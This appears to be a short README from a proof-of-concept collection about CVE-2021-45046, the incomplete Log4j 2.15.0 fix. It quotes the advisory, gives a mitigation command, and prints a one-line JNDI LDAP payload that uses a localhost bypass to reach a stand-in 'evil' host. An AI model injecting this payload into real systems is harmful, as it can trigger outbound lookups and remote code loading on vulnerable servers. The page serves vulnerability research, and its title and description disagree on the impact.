# Log4j 2.15.0 Privilege Escalation -- CVE-2021-45046

## Attack

![](images/1.png)

## Discription

It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack. Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property `log4j2.noFormatMsgLookup` to `true` do NOT mitigate this specific vulnerability. Log4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (<2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).

## cvss 3.7 -> 9

Poc

```
${jndi:ldap://127.0.0.1#evil[.]com:1389/a}
```

## Log4shell Topic

https://github.com/cckuailong/reapoc/tree/main/Topic/Log4j

## Welcome to contribute in reapoc

https://github.com/cckuailong/reapoc
